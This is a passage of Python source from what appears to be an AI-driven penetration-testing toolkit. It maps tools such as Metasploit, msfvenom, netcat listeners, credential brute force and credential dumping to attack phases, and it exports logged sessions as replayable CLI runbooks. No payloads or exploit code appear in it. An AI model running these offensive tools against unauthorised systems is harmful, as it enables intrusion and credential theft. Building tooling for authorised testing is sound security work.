    "zap_ajax_spider_status": "Discovery",
    "zap_stop_ajax_spider": "Discovery",
    "zap_active_scan": "Vulnerability Assessment",
    "zap_scan_status": "Vulnerability Assessment",
    "zap_stop_scan": "Vulnerability Assessment",
    "zap_passive_scan_status": "Vulnerability Assessment",
    "zap_get_alerts": "Vulnerability Assessment",
    "zap_alert_detail": "Vulnerability Assessment",
    "zap_get_sites": "Discovery",
    "zap_get_urls": "Discovery",
    "zap_get_history": "Discovery",
    "zap_generate_report": "Vulnerability Assessment",
    "zap_list_scan_policies": "Vulnerability Assessment",
    "zap_new_session": "Discovery",
    "zap_access_url": "Discovery",

    # Burp Suite
    "burp_check_connection": "Discovery",
    "burp_start_scan": "Vulnerability Assessment",
    "burp_scan_status": "Vulnerability Assessment",
    "burp_scan_issues": "Vulnerability Assessment",
    "burp_cancel_scan": "Vulnerability Assessment",
    "burp_issue_definitions": "Vulnerability Assessment",
    "burp_scan_configs": "Vulnerability Assessment",

    # Exploitation
    "searchsploit_search": "Exploitation",
    "searchsploit_examine": "Exploitation",
    "searchsploit_mirror": "Exploitation",
    "msfconsole_run": "Exploitation",
    "msfvenom_generate": "Exploitation",
    "msf_list_exploits": "Exploitation",
    "msf_list_payloads": "Exploitation",
    "msf_search_modules": "Exploitation",
    "msf_module_info": "Exploitation",
    "msf_run_exploit": "Exploitation",
    "msf_run_auxiliary": "Exploitation",
    "msf_start_listener": "Exploitation",
    "msf_generate_payload": "Exploitation",
    "msf_list_sessions": "Exploitation",
    "msf_session_command": "Post-Exploitation",
    "msf_run_post": "Post-Exploitation",
    "msf_terminate_session": "Post-Exploitation",
    "msf_list_jobs": "Exploitation",
    "msf_stop_job": "Exploitation",
    "credential_test": "Exploitation",
    "default_creds_check": "Exploitation",
    "netcat_connect": "Exploitation",
    "netcat_listen": "Exploitation",
    "auth_login": "Exploitation",

    # Verification
    "verify_sqli": "Verification",
    "verify_rce": "Verification",
    "verify_lfi": "Verification",
    "verify_default_creds": "Verification",
    "verify_cve": "Verification",

    # Post-exploitation
    "postexploit_system_info": "Post-Exploitation",
    "postexploit_privesc_check": "Post-Exploitation",
    "postexploit_read_file": "Post-Exploitation",
    "postexploit_credential_dump": "Post-Exploitation",
    "postexploit_internal_scan": "Post-Exploitation",
}

# Internal tools to skip in runbook output
SKIP_TOOLS = {
    "target_add", "target_add_port", "target_add_credential", "target_add_vuln",
    "target_log_scan", "target_get", "target_list", "target_clear",
    "attack_surface_map", "auth_set_token", "auth_headers", "auth_clear",
    "evidence_capture", "evidence_list", "evidence_get", "evidence_clear",
    "report_add_finding", "report_list_findings", "report_clear_findings",
    "report_import_evidence", "report_generate",
    "session_create", "session_exec", "session_read", "session_close",
    "session_list", "session_history",
}


# =============================================================================
# EXPORT FUNCTION
# =============================================================================

def export_runbook(
    session_file: str = "",
    phases: str = "",
    include_output: bool = False,
) -> str:
    """
    Export the current session as a structured runbook with CLI commands.
    Produces a reproducible, step-by-step text file that can be executed
    manually without the AI tool.

    CLI-ONLY — this function is never registered on the MCP server.

    Args:
        session_file: Path or name of session file to export. If empty, uses
                      the most recent session in the sessions directory.
        phases: Comma-separated phases to include (e.g., "Reconnaissance,Enumeration").
                If empty, includes all phases.
        include_output: If True, include truncated tool output under each step.

    Returns:
        Confirmation with the path to the exported runbook file.
    """
    # Load session
    session_data = _load_session(session_file)
    if isinstance(session_data, str):
        return session_data  # Error message

    scans = session_data.get("scans", [])
    if not scans:
        return "Error: Session has no scans to export."

    targets = session_data.get("targets", [])
    session_name = session_data.get("name") or "unnamed"
    created = session_data.get("created_at", "")[:10]

    # Filter phases
    phase_filter = set()
    if phases:
        phase_filter = {p.strip() for p in phases.split(",")}

    # Build runbook
    lines = []
    lines.append("=" * 70)
    lines.append("PENETRATION TEST RUNBOOK")
    lines.append("=" * 70)
    lines.append(f"Session:    {session_name}")
    lines.append(f"Date:       {created}")
    lines.append(f"Exported:   {datetime.now().strftime('%Y-%m-%d %H:%M')}")
    if targets:
        lines.append(f"Targets:    {', '.join(targets[:10])}")
        if len(targets) > 10:
            lines.append(f"            ... and {len(targets) - 10} more")
    lines.append(f"Total Steps: {len([s for s in scans if s.get('tool') not in SKIP_TOOLS])}")
    lines.append("=" * 70)
    lines.append("")
    lines.append("DISCLAIMER: This runbook was auto-generated from an assessment session.")
    lines.append("Execute each step in order. Some steps depend on output from prior steps.")
    lines.append("Passwords marked '***' must be replaced with actual credentials.")
    lines.append("")

    step_num = 0
    current_phase = None

    for scan in scans:
        tool = scan.get("tool", "")
        args = scan.get("arguments", {})
        elapsed = scan.get("elapsed", 0)
        timestamp = scan.get("timestamp", "")[:19]
        result = scan.get("result", "")

        # Skip internal state tools
        if tool in SKIP_TOOLS:
            continue

        phase = PHASE_MAP.get(tool, "Other")

        # Phase filter
        if phase_filter and phase not in phase_filter:
            continue

        # Phase header
        if phase != current_phase:
            current_phase = phase
            lines.append("")
            lines.append("-" * 70)
            lines.append(f"  PHASE: {phase.upper()}")
            lines.append("-" * 70)
            lines.append("")

        step_num += 1

        # Get CLI command
        template_fn = CLI_TEMPLATES.get(tool)
        if template_fn:
            try:
                cli_cmd = template_fn(args)
            except Exception:
                cli_cmd = f"# {tool}({', '.join(f'{k}={v}' for k, v in args.items())})"
        else:
            cli_cmd = f"# {tool}({', '.join(f'{k}={v}' for k, v in args.items())})"

        # Step header
        lines.append(f"## Step {step_num} — {_tool_display_name(tool)}")
        lines.append(f"   Time: {timestamp}  |  Duration: {elapsed:.1f}s")
        lines.append("")

        # Command
        for cmd_line in cli_cmd.split("\n"):
            lines.append(f"    {cmd_line}")
        lines.append("")

        # Optional output
        if include_output and result:
            output_preview = result[:500]
            if len(result) > 500:
                output_preview += f"\n... ({len(result)} chars total)"
            lines.append("   Output:")
            for out_line in output_preview.split("\n"):
                lines.append(f"   | {out_line}")
            lines.append("")

    lines.append("")
    lines.append("=" * 70)
    lines.append(f"END OF RUNBOOK — {step_num} steps")
    lines.append("=" * 70)

    # Write file
    os.makedirs(REPORTS_DIR, exist_ok=True)
    safe_name = session_name.replace(" ", "-").replace("/", "-")[:30]
    filename = f"runbook_{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    filepath = os.path.join(REPORTS_DIR, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))

    return f"Runbook exported: {filepath}\n{step_num} steps across {len(set(PHASE_MAP.get(s.get('tool'), 'Other') for s in scans if s.get('tool') not in SKIP_TOOLS))} phases."


def _load_session(session_file: str) -> dict:
    """Load a session file by name, path, or find the most recent one."""
    sessions_dir = Path(SESSIONS_DIR)

    if not session_file:
        # Find most recent session
        files = sorted(sessions_dir.glob("*.json"), key=lambda f: f.stat().st_mtime, reverse=True)
        if not files:
            return "Error: No session files found in sessions directory."
        session_file = str(files[0])
    elif not os.path.isabs(session_file):
        # Try as filename in sessions dir
        candidate = sessions_dir / session_file
        if not candidate.exists():
            # Try fuzzy match
            matches = list(sessions_dir.glob(f"*{session_file}*.json"))
            if matches:
                candidate = matches[0]
            else:
                return f"Error: Session not found: {session_file}"
        session_file = str(candidate)

    try:
        with open(session_file, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError) as e:
        return f"Error reading session file: {e}"


def _tool_display_name(tool_name: str) -> str:
    """Convert tool_name to a readable display name."""
    names = {
        "nmap_scan": "Nmap Port Scan",
        "masscan_scan": "Masscan Fast Scan",
        "netcat_connect": "Netcat Connect",
        "netcat_listen": "Netcat Listener",
        "dns_lookup": "DNS Lookup",
        "whois_lookup": "WHOIS Lookup",
        "crtsh_lookup": "Certificate Transparency (crt.sh)",
        "subfinder_enum": "Subfinder Subdomain Enumeration",
        "arjun_scan": "Arjun Parameter Discovery",
        "theharvester_search": "theHarvester OSINT",
        "shodan_search": "Shodan Search",
        "email_harvest": "Email Harvesting",
        "http_probe": "HTTP Probe",
        "http_headers_check": "Security Headers Check",
        "http_fetch": "HTTP Request",
        "http_methods": "HTTP Methods Check",
        "cookie_check": "Cookie Security Check",
        "ffuf_fuzz": "FFuf Web Fuzzing",
        "katana_crawl": "Katana Web Crawl",
        "waybackurls_fetch": "Wayback Machine URLs",
        "nikto_scan": "Nikto Web Scanner",
        "enum4linux_scan": "Enum4linux SMB Enumeration",
        "testssl_scan": "TestSSL Analysis",
        "sslscan_check": "SSLScan Check",
        "smbclient_list": "SMB Share Listing",
        "feroxbuster_scan": "Feroxbuster Directory Scan",
        "gobuster_dir": "Gobuster Directory Scan",
        "nuclei_scan": "Nuclei Vulnerability Scan",
        "sqlmap_scan": "SQLMap Injection Test",
        "sqli_payloads": "SQL Injection Payloads",
        "commix_scan": "Commix Command Injection",
        "credential_test": "Credential Brute-Force",
        "default_creds_check": "Default Credentials Check",
        "wpscan_scan": "WPScan WordPress Scan",
        "searchsploit_search": "SearchSploit Lookup",
        "searchsploit_examine": "Exploit Examination",
        "searchsploit_mirror": "Exploit Download",
        "msfconsole_run": "Metasploit Framework",
        "msfvenom_generate": "MSFVenom Payload Generation",
        "msf_list_exploits": "Metasploit Exploit Search",
        "msf_list_payloads": "Metasploit Payload Search",
        "msf_search_modules": "Metasploit Module Search",
        "msf_module_info": "Metasploit Module Info",
        "msf_run_exploit": "Metasploit Exploit Execution",
        "msf_run_auxiliary": "Metasploit Auxiliary Module",
        "msf_run_post": "Metasploit Post-Exploitation",
        "msf_list_sessions": "Metasploit Session List",
        "msf_session_command": "Metasploit Session Command",
        "msf_terminate_session": "Metasploit Session Terminate",
        "msf_start_listener": "Metasploit Handler/Listener",
        "msf_list_jobs": "Metasploit Job List",
        "msf_stop_job": "Metasploit Stop Job",
        "msf_generate_payload": "Metasploit RPC Payload Generation",
        "zap_baseline_scan": "ZAP Baseline Scan",
        "zap_full_scan": "ZAP Full Scan",
        "zap_api_scan": "ZAP API Scan",
        "zap_create_context": "ZAP Create Context",
        "zap_list_contexts": "ZAP List Contexts",
        "zap_spider": "ZAP Spider",
        "zap_spider_status": "ZAP Spider Status",
        "zap_stop_spider": "ZAP Stop Spider",
        "zap_ajax_spider_status": "ZAP Ajax Spider Status",
        "zap_stop_ajax_spider": "ZAP Stop Ajax Spider",
        "zap_active_scan": "ZAP Active Scan",
        "zap_scan_status": "ZAP Scan Status",
        "zap_stop_scan": "ZAP Stop Scan",
        "zap_passive_scan_status": "ZAP Passive Scan Status",
        "zap_get_alerts": "ZAP Get Alerts",
        "zap_alert_detail": "ZAP Alert Detail",
        "zap_get_sites": "ZAP Sites Tree",
        "zap_get_urls": "ZAP Discovered URLs",
        "zap_get_history": "ZAP HTTP History",
        "zap_generate_report": "ZAP Report Generation",
        "zap_list_scan_policies": "ZAP Scan Policies",
        "zap_new_session": "ZAP New Session",
        "zap_access_url": "ZAP Access URL",
        "burp_check_connection": "Burp Suite Connection Check",
        "burp_start_scan": "Burp Suite Scan",
        "burp_scan_status": "Burp Suite Scan Status",
        "burp_scan_issues": "Burp Suite Issue Detail",
        "burp_cancel_scan": "Burp Suite Cancel Scan",
        "burp_issue_definitions": "Burp Suite Issue Definitions",
        "burp_scan_configs": "Burp Suite Scan Configs",
        "jwt_test": "JWT Security Test",
        "graphql_test": "GraphQL Security Test",
        "auth_login": "Authenticated Login",
        "auth_test": "Auth Token Test",
        "verify_sqli": "SQL Injection Verification",
        "verify_rce": "RCE Verification",
        "verify_lfi": "LFI Verification",
        "verify_default_creds": "Default Creds Verification",
        "verify_cve": "CVE Verification",
        "postexploit_system_info": "Post-Exploit System Info",
        "postexploit_privesc_check": "Privilege Escalation Check",
        "postexploit_read_file": "Remote File Read",
        "postexploit_credential_dump": "Credential Dump",
        "postexploit_internal_scan": "Internal Network Scan",
    }
    return names.get(tool_name, tool_name.replace("_", " ").title())
